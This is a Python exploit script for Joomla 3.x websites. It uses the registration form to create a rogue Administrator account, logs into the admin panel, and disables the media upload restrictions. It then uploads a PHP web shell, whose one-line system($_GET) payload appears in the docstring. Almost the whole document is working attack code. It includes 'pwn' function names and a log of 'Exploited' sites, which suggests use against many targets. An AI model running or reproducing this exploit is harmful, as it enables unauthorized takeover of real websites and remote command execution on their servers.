#!/usr/bin/python
import requests
import sys
import re
import argparse
import base64
import os
import random
import time
try:
	# Python 2.6-2.7
	from HTMLParser import HTMLParser
except ImportError:
	# Python 3
	from html.parser import HTMLParser

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
rr = '\033[39m'
"""
How to exploit:

  1) Run script, get user access
  2) [optional] - Activate your account
  3) Go to Content > Media
  4) Click 'Options'
  5.1) Add php3, php4, php5, pht to 'Legal Extensions' & Legal Image Extensions
  5.2) Disable 'Restrict Uploads' & 'Check MIME Types'
  6) Upload '.pht' file with:
      <?= system($_GET['x']);
  7) Pwned
"""

def randomname(extn='.pht'):
	return base64.b32encode(os.urandom(20))[:random.randint(5, 10)] + extn

def extract_token(resp):
	try:
		match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
		if match is None:
			return None
		return match.group(1)
	except:
		sys.exit()

def try_admin_login(options, sess):
	try:
		admin_url = options.url + '/administrator/index.php'
		resp = sess.get(admin_url)
		token = extract_token(resp)
		if not token:
			return False
		data = {
			'username': options.username,
			'passwd': options.password,
			'task': 'login',
			token: '1'
		}
		resp = sess.post(admin_url, data=data)
		if 'task=profile.edit' not in resp.text:
			return
		return True
	except:
		sys.exit()

def get_media_options(options, sess):
	try:
		media_options_url = options.url + '/administrator/index.php?option=com_config&view=component&component=com_media&path='
		resp = sess.get(media_options_url)
		results = re.findall(r'name="([^"]+)"\s+[^>]*?value="([^"]+)"', resp.text, re.S)
		if not results:
			return
		return dict(results)
	except:
		sys.exit()

def set_media_options(options, sess, data):
	"""
	Allow us to upload a .pht file
	"""
	try:
		newdata = {
			'jform[upload_extensions]': 'bmp,csv,doc,gif,ico,jpg,jpeg,odg,odp,ods,odt,pdf,png,ppt,swf,txt,xcf,xls,BMP,CSV,DOC,GIF,ICO,JPG,JPEG,ODG,ODP,ODS,ODT,PDF,PNG,PPT,SWF,TXT,XCF,XLS',
			'jform[upload_maxsize]':10,
			'jform[file_path]':'images',
			'jform[image_path]':'images',
			'jform[restrict_uploads]':1,
			'jform[check_mime]':0,
			'jform[image_extensions]':'bmp,gif,jpg,png',
			'jform[ignore_extensions]': '',
			'jform[upload_mime]': 'image/jpeg,image/gif,image/png,image/bmp,application/x-shockwave-flash,application/msword,application/excel,application/pdf,application/powerpoint,text/plain,application/x-zip',
			'jform[upload_mime_illegal]':'text/html',
			'id':13
		}
		newdata.update(data)
		newdata['component'] = 'com_media'
		newdata['task'] = 'config.save.component.apply'
		config_url = options.url + '/administrator/index.php?option=com_config'
		resp = sess.post(config_url, data=newdata)
		if 'jform[upload_extensions]' not in resp.text:
			return False
		return True
	except:
		sys.exit()

def add_item(data, field, item):
	return ",".join(set(data.get(field, '').split(',') + [item]))

def stage_two(options, sess):
	try:
		"""Now we are logged in to admin area,
		   use this to gain shell execution using .pht upload.
		   Ooh, scary super 0-day lol ^_^ *rolleyes*
		"""
		media_options = get_media_options(options, sess)
		if not media_options:
			return False
		old_options = media_options.copy()
		media_options.update({
			'jform[check_mime]': 0,
			'jform[restrict_uploads]': 0,
			'jform[upload_extensions]': add_item(media_options, 'jform[upload_extensions]', 'pht'),
			'jform[image_extensions]': add_item(media_options, 'jform[image_extensions]', 'pht'),
			'jform[upload_mime]': add_item(media_options, 'jform[upload_mime]', 'application/octet-stream'),
		})
		if not set_media_options(options, sess, media_options):
			return False
		image_path = media_options.get('jform[image_path]', 'images')
		return upload_file(options, sess, image_path)
	except:
		sys.exit()

def upload_file(options, sess, image_path):
	try:
		url = options.url + "/administrator/index.php?option=com_media&folder="
		resp = sess.get(url)
		match = re.search(r'form action="([^"]+)" id="uploadForm"', resp.text, re.S)
		if not match:
			return False
		upload_url = HTMLParser().unescape(match.group(1))
		filename = randomname()
		exploit_url = "%s/%s/%s" % (options.url, image_path, filename)
		files = {
			'Filedata[]': (filename, options.exploit, 'application/octet-stream')
		}
		data = dict(folder="")
		resp = sess.post(upload_url, files=files, data=data)
		if filename not in resp.content:
			return False
		resp = sess.get(exploit_url)
		if options.search not in resp.content:
			return False
		return True
	except:
		sys.exit()

def create_user(options, sess, token):
	try:
		"""
		Create an Administrtaor user using the CVE
		"""
		data = {
			# User object
			'user[name]': options.username,
			'user[username]': options.username,
			'user[password1]': options.password,
			'user[password2]': options.password,
			'user[email1]': options.email,
			'user[email2]': options.email,
			'user[groups][]': '7',	# Yay, Administrator!
			# Sometimes these will be overridden
			'user[activation]': '0',
			'user[block]': '0',
	
			# Form data
			'form[name]': options.username,
			'form[username]': options.username,
			'form[password1]': options.password,
			'form[password2]': options.password,
			'form[email1]': options.email,
			'form[email2]': options.email,
			'form[option]': 'com_users',
			'form[task]': 'user.register',
			token: '1',
		}
		return sess.post(options.url + "/index.php/component/users/?task=user.register", data=data, allow_redirects=False)
	except:
		sys.exit()

def parse_options():
	try:
		exploit_file = open('filthyc0w.pht', 'r')
	except Exception:
		exploit_file = None
	parser = argparse.ArgumentParser(description='Jooma Exploit')
	parser.add_argument('url', help='Base URL for Joomla site')
	parser.add_argument('-u', '--username', default='hacker')
	parser.add_argument('-p', '--password', default='password')
	parser.add_argument('-e', '--email', default='hacker@example.com')
	parser.add_argument('-s', '--search', default='098f6bcd4621d373cade4e832627b4f6')
	parser.add_argument('-x', '--exploit', default=exploit_file, type=argparse.FileType('r'))
	return parser.parse_args()

def pwn_joomla(options):
	try:
		sess = requests.Session()
		resp = sess.get(options.url + "/index.php/component/users/?view=login")
		token = extract_token(resp)
		if not token:
			return False
		resp = create_user(options, sess, token)
		can_login = try_admin_login(options, sess)
		if not can_login:
			# TODO: periodically check if we can login as admin
			print(g + '[' + g + '+' + g + '] ' + g + '[Joomla 3x Add admin]' + g + ' [Done]')
			with open('Exploited/BruteForce.txt', 'a') as writer:
				writer.write(options.url + '/administrator/index.php' + '\n')
			can_login = try_admin_login(options, sess)
			if not can_login:
				return False
		else:
			print(options.url + ' --> Joomla TakeAdmin Failed!')
		return stage_two(options, sess)
	except:
		sys.exit()

def main(base_url):
	options = parse_options()
	if pwn_joomla(options):
		pass
	else:
		pass

if __name__ == "__main__":
	sys.exit(main("http://192.168.10.100:8080/joomla"))
